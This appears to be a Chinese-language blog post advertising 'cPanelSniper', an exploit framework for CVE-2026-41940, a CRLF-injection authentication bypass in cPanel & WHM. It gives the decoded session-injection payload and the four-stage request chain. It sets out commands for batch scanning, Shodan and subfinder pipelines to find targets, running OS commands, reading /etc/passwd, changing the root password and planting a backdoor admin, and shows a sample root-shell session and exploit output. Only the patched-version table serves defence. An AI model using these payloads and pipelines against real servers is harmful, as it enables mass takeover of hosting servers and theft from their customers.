#  cPanelSniper：CVSS 10.0的cPanel认证绕过漏洞利用框架  
 幻泉之洲   2026-05-04 05:00  
  
> cPanelSniper是一个针对CVE-2026-41940漏洞的利用框架，该漏洞允许攻击者通过CRLF注入绕过cPanel & WHM的认证，获取root级别WHM访问权限。工具纯Python编写，无外部依赖，支持批量扫描、交互式shell和后渗透操作。本文详细分析漏洞原理、利用链、使用方法和实战案例。  
  
## 概述  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibe5kiaGVTyWeduOSXx7TmOqlvaM2UAK4mATHtBAESjEtWSic6Vp7HYcwb78VWvibvunZRwwhibFsbGIgrNh0YPRL2XEENoTNZiauicsE/640?wx_fmt=png&from=appmsg "")  
  
CVE-2026-41940是cPanel & WHM的一个关键认证绕过漏洞，CVSS评分10.0。攻击者不需要任何有效凭证，仅通过在HTTP请求的Authorization头部注入CRLF序列，就能将脏数据写入会话文件，最终拿到root级WHM控制权。根据官方数据，全球约7000万个域名运行cPanel，而这个漏洞在2026年4月已被证实存在野外利用。  
  
漏洞编号：NVD - CVE-2026-41940  
## 漏洞原理  
  
问题出在Session.pm这个模块里。saveSession()函数在把会话文件写入磁盘之前，先调用了filter_sessiondata()做过滤——但文件已经在磁盘上了。这意味着Authorization: Basic头部里的CRLF字符会被原样写入会话文件，攻击者控制的字段在过滤之前就已经存在了。  
  
正常流程：  
  
  POST /login/ → filter_sessiondata() → 写会话 → 认证检查  
  
  
漏洞流程：  
  
  POST /login/ → 写会话（CRLF载荷注入）→ filter_sessiondata() → 认证读取被污染的文件  
## CRLF载荷  
  
Authorization: Basic的值解码后是这样的：  
  
root:x  
  
successful_internal_auth_with_timestamp=9999999999  
  
user=root  
  
tfa_verified=1  
  
hasroot=1  
  
这些字段直接写进会话文件。cPanel读文件的时候，把这些当成了合法的会话字段，于是赋予完全root权限。  
## 四阶段利用链  
  
整个漏洞利用分四步走：  
- Stage 0 — 主机名发现：GET /openid_connect/cpanelid → 307跳转暴露真实主机名  
  
- Stage 1 — 铸造预认证会话：POST /login/?login_only=1（用错误凭证）→ 拿到401响应和whostmgrsession cookie  
  
- Stage 2 — CRLF注入：GET / + Cookie: session + Authorization: Basic（带CRLF）→ cpsrvd把CRLF字段写入会话文件 → 307跳转到/cpsessXXXXXXXXXX/...  
  
- Stage 3 — 触发do_token_denied gadget：GET /scripts2/listaccts → 触发原始会话→缓存刷新，让注入的字段生效 → 401 Token denied（正常现象）  
  
- Stage 4 — 验证WHM root访问：GET /cpsessXXXXXXXXXX/json-api/version → 200返回版本信息，表示渗透成功  
  
## 受影响版本  
<table><thead><tr><th><section><span leaf="">分支</span></section></th><th><section><span leaf="">受影响版本</span></section></th><th><section><span leaf="">修复版本</span></section></th></tr></thead><tbody><tr><td><section><span leaf="">110.x</span></section></td><td><section><span leaf="">≤ 11.110.0.96</span></section></td><td><section><span leaf="">11.110.0.97</span></section></td></tr><tr><td><section><span leaf="">118.x</span></section></td><td><section><span leaf="">≤ 11.118.0.62</span></section></td><td><section><span leaf="">11.118.0.63</span></section></td></tr><tr><td><section><span leaf="">126.x</span></section></td><td><section><span leaf="">≤ 11.126.0.53</span></section></td><td><section><span leaf="">11.126.0.54</span></section></td></tr><tr><td><section><span leaf="">132.x</span></section></td><td><section><span leaf="">≤ 11.132.0.28</span></section></td><td><section><span leaf="">11.132.0.29</span></section></td></tr><tr><td><section><span leaf="">134.x</span></section></td><td><section><span leaf="">≤ 11.134.0.19</span></section></td><td><section><span leaf="">11.134.0.20</span></section></td></tr><tr><td><section><span leaf="">136.x</span></section></td><td><section><span leaf="">≤ 11.136.0.4</span></section></td><td><section><span leaf="">11.136.0.5</span></section></td></tr></tbody></table>## 基本用法  
  
扫描单个目标：  
  
# 仅扫描  
  
python3 cPanelSniper.py -u https://target.com:2087  
  
  
# 扫描并进入交互式shell  
  
python3 cPanelSniper.py -u https://target.com:2087 --action shell  
  
  
# 批量扫描  
  
python3 cPanelSniper.py -l targets.txt -t 20 -o results.json  
  
  
# 强制扫描（跳过cPanel检测）  
  
python3 cPanelSniper.py -u https://target.com:2087 --force  
### 后渗透操作  
  
# 列出所有cPanel账户  
  
python3 cPanelSniper.py -u https://target.com:2087 --action list  
  
  
# 执行OS命令  
  
python3 cPanelSniper.py -u https://target.com:2087 --action cmd --cmd "id;whoami;uname -a"  
  
python3 cPanelSniper.py -u https://target.com:2087 --action cmd --cmd "ls /home"  
  
python3 cPanelSniper.py -u https://target.com:2087 --action cmd --cmd "cat /etc/passwd"  
  
  
# 获取服务器信息（主机名、负载、磁盘、MySQL主机）  
  
python3 cPanelSniper.py -u https://target.com:2087 --action info  
  
  
# 获取cPanel版本  
  
python3 cPanelSniper.py -u https://target.com:2087 --action version  
  
  
# 修改root密码  
  
python3 cPanelSniper.py -u https://target.com:2087 --action passwd --passwd 'NewPass@2026!'  
  
  
# 交互式WHM shell  
  
python3 cPanelSniper.py -u https://target.com:2087 --action shell  
### 管道集成  
  
这款工具天生适合与其他工具配合：  
  
# subfinder + httpx + cPanelSniper  
  
subfinder -d target.com -silent | \  
  
  httpx -silent -ports 2087,2086 -threads 50 | \  
  
  python3 cPanelSniper.py -t 30 -o results.json  
  
  
# 从scope列表读取  
  
cat scope.txt | \  
  
  httpx -silent -ports 2087,2086 -threads 100 | \  
  
  python3 cPanelSniper.py -t 30 -o results.json  
  
  
# Shodan结果  
  
shodan search --fields ip_str,port 'title:"WHM Login"' | \  
  
  awk '{print "https://"$1":"$2}' | \  
  
  python3 cPanelSniper.py -t 30 -o shodan_results.json  
  
  
# 标准输入管道  
  
echo "https://target.com:2087" | python3 cPanelSniper.py  
  
  
# 多来源合并  
  
{ subfinder -d target.com -silent; cat extra.txt; } | \  
  
  httpx -silent -ports 2087 | \  
  
  python3 cPanelSniper.py -t 20 --action list  
### 交互式WHM Shell  
  
成功绕过后，使用--action shell  
会进入一个交互式提示符：  
  
════════════════════════════════════════════════════════════  
  
  WHM Shell — target.com  
  
  Version: CVE-2026-41940 | Auth: CRLF bypass  
  
  Type 'help' for commands, 'exit' to quit  
  
════════════════════════════════════════════════════════════  
  
  
mitsec@target.com ▶ id  
  
  uid=0(root) gid=0(root) groups=0(root)  
  
  
mitsec@target.com ▶ accounts  
  
  [cPanel Accounts]  target.com:2087 (47 users)  
  
    user01               domain: example.com    email: admin@example.com  
  
    user02               domain: shop.com       email: info@shop.com  
  
    ...  
  
  
mitsec@target.com ▶ cat /etc/passwd  
  
  root:x:0:0:root:/root:/bin/bash  
  
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
  
  ...  
  
  
mitsec@target.com ▶ info  
  
  [Server Info]  https://target.com:2087  
  
  hostname: srv01.target.com  
  
  load: 0.72 / 0.66 / 0.69  
  
  version: 11.130.0.6  
  
  
mitsec@target.com ▶ addadmin mitsec P@ss2026!  
  
  [BACKDOOR ADMIN CREATED]  
  
  Target   : https://target.com:2087  
  
  Username : mitsec  
  
  Password : P@ss2026!  
  
  Profile  : super_admin  
  
  
mitsec@target.com ▶ exit  
### Shell命令列表  
<table><thead><tr><th><section><span leaf="">命令</span></section></th><th><section><span leaf="">描述</span></section></th></tr></thead><tbody><tr><td><section><span leaf="">id / whoami</span></section></td><td><section><span leaf="">显示UID和主机名</span></section></td></tr><tr><td><section><span leaf="">hostname</span></section></td><td><section><span leaf="">获取服务器主机名</span></section></td></tr><tr><td><section><span leaf="">version</span></section></td><td><section><span leaf="">cPanel版本信息</span></section></td></tr><tr><td><section><span leaf="">info</span></section></td><td><section><span leaf="">负载、磁盘、MySQL主机、版本</span></section></td></tr><tr><td><section><span leaf="">accounts</span></section></td><td><section><span leaf="">列出所有cPanel用户账户</span></section></td></tr><tr><td><section><span leaf="">cat &lt;文件&gt;</span></section></td><td><section><span leaf="">读取文件内容</span></section></td></tr><tr><td><section><span leaf="">ls [路径]</span></section></td><td><section><span leaf="">列出目录</span></section></td></tr><tr><td><section><span leaf="">exec &lt;命令&gt;</span></section></td><td><section><span leaf="">执行OS命令</span></section></td></tr><tr><td><section><span leaf="">addadmin &lt;用户名&gt;&lt;密码&gt;</span></section></td><td><section><span leaf="">创建后门WHM管理员</span></section></td></tr><tr><td><section><span leaf="">passwd &lt;新密码&gt;</span></section></td><td><section><span leaf="">修改root密码</span></section></td></tr><tr><td><section><span leaf="">api &lt;模块&gt; [k=v ...]</span></section></td><td><section><span leaf="">原始WHM JSON API调用</span></section></td></tr><tr><td><section><span leaf="">help</span></section></td><td><section><span leaf="">显示所有命令</span></section></td></tr><tr><td><section><span leaf="">exit</span></section></td><td><section><span leaf="">退出Shell</span></section></td></tr></tbody></table>## CLI参考  
  
usage: cPanelSniper.py [-h] [-u URL] [-l LIST] [--hostname HOSTNAME]  
  
                       [-t THREADS] [--timeout TIMEOUT] [--rate-limit N]  
  
                       [--action ACTION] [--passwd PASS] [--cmd CMD]  
  
                       [--new-user USER] [--new-domain DOMAIN]  
  
                       [-o OUTPUT] [--no-color]  
  
  
Target:  
  
  -u, --url URL         单个目标URL（例如 https://host:2087）  
  
  -l, --list LIST       包含URL的文件（每行一个）  
  
  --hostname HOSTNAME   覆盖规范化的Host头（自动发现）  
  
  
Scan:  
  
  -t, --threads N       并发线程数（默认：10）  
  
  --timeout N           请求超时秒数（默认：15）  
  
  --rate-limit N        目标间延迟（默认：0）  
  
  --force               跳过cPanel检测  
  
  
Post-Exploit:  
  
  --action ACTION       动作：list | passwd | cmd | exec | info |  
  
                                 version | shell | adduser  
  
  --passwd PASS         新root密码（配合--action passwd）  
  
  --cmd CMD             OS命令（配合--action cmd/exec）  
  
  --new-user USER       新cPanel用户名（配合--action adduser）  
  
  --new-domain DOMAIN   新cPanel域名（配合--action adduser）  
  
  
Output:  
  
  -o, --output FILE     将结果保存为JSON文件  
  
  --no-color            禁用ANSI颜色  
## Shodan搜索语法  
  
title:"WHM Login"  
  
title:"WebHost Manager" port:2087  
  
product:"cPanel" port:2087  
  
http.title:"cPanel" port:2083  
  
ssl.cert.subject.cn:"cPanel" port:2087  
## 输出示例  
  
   ██████╗██████╗  █████╗ ███╗  ██╗███████╗██╗  
  
  ██╔════╝██╔══██╗██╔══██╗████╗ ██║██╔════╝██║  
  
  ...  
  
  
  CVE-2026-41940 — cPanel & WHM Auth Bypass via CRLF Injection  
  
  4-stage: preauth → CRLF inject → propagate → verify → post-exploit  
  
  In-The-Wild | CVSS 10.0 | By Mitsec (@ynsmroztas)  
  
  
  Configuration:  
  
   Targets  : 1  
  
   Threads  : 10  
  
   Timeout  : 15s  
  
   Action   : list  
  
  
14:46:22 [SCAN] Starting 4-stage exploit chain... https://target.com:2087  
  
14:46:23 [INFO] Canonical hostname discovered: srv01.target.com  
  
14:46:23 [STEP] Stage 1/4 — Minting preauth session...  
  
14:46:23 [  OK] Stage1: preauth session = :QFB4o8XENBqlr6U1...  
  
14:46:23 [STEP] Stage 2/4 — CRLF injection via Authorization header...  
  
14:46:24 [  OK] Stage2: HTTP 307 → token=/cpsess8493537756  
  
14:46:24 [STEP] Stage 3/4 — Firing do_token_denied gadget (raw→cache)...  
  
14:46:25 [  OK] Stage3: HTTP 401 — do_token_denied gadget fired  
  
14:46:25 [STEP] Stage 4/4 — Verifying WHM root access...  
  
14:46:26 [PWND] CVE-2026-41940 CONFIRMED — WHM root access!  
  
14:46:26 [PWND]   Token    : /cpsess8493537756  
  
14:46:26 [PWND]   Version  : 11.130.0.6  
  
14:46:26 [PWND]   API URL  : https://target.com:2087/cpsess8493537756/json-api/version  
  
14:46:26 [ API] Running post-exploit action: list  
  
14:46:27 [ API] listaccts → HTTP 200  
  
  
  [cPanel Accounts]  target.com:2087 (47 accounts)  
  
    client01    domain: client01.com    email: admin@client01.com  
  
    client02    domain: client02.net    email: info@client02.net  
  
    ...  
  
  
══════════════════════════════════════════════════════════════════════  
  
  cPanelSniper — Scan Complete  
  
  Time: 5.8s  ·  Targets: 1  
  
  
  ⚡ 1 VULNERABLE TARGET(S)  
  
  
  Target   : https://target.com:2087  
  
  Version  : 11.130.0.6  
  
  Token    : /cpsess8493537756  
  
  API URL  : https://target.com:2087/cpsess8493537756/json-api/version  
  
══════════════════════════════════════════════════════════════════════  
## 技术细节  
### 会话文件注入  
  
注入的Authorization: Basic值（base64解码后）包含CRLF序列，在会话文件中变成换行：  
  
root:x\r\n  
  
successful_internal_auth_with_timestamp=9999999999\r\n  
  
user=root\r\n  
  
tfa_verified=1\r\n  
  
hasroot=1  
  
cPanel的会话读取器把这些解析为合法的会话字段，从而授予完全root WHM访问权限。  
### Stage 3 — do_token_denied gadget  
  
这一步经常被忽略。CRLF注入（Stage 2）之后，被污染的会话数据只存在于原始会话文件中。对/scripts2/listaccts  
发一个请求会触发内部的do_token_denied处理器，该处理器会把原始会话数据刷新到会话缓存。没有这一步刷新，Stage 4会返回403。  
### 会话令牌提取  
  
Set-Cookie: whostmgrsession=%3aSESSION_NAME%2cOB_HEX; ...  
  
                              ^              ^  
  
                              |              +-- ob hash（已剥离）  
  
                              +-- 会话名称（用于注入）  
  
会话名称（在%2C之前）被提取出来，作为后续请求的cookie值。  
## 参考资料  
- watchTowr Labs — CVE-2026-41940技术分析（https://labs.watchtowr.com/the-internet-is-falling-down-falling-down-falling-down-cpanel-whm-authentication-bypass-cve-2026-41940/）  
  
- cPanel安全公告（https://support.cpanel.net/hc/en-us/articles/40073787579671-cPanel-WHM-Security-Update-04-28-2026）  
  
- NVD — CVE-2026-41940（https://nvd.nist.gov/vuln/detail/CVE-2026-41940）  
  
- Hadrian博客 — CVE-2026-41940分析（https://hadrian.io/blog/cve-2026-41940-a-critical-authentication-bypass-in-cpanel）  
  
- Nuclei模板 — CVE-2026-41940（https://cloud.projectdiscovery.io/library/CVE-2026-41940）  
  
**获取方式：私信回复"cPanelSniper"获取**  
  
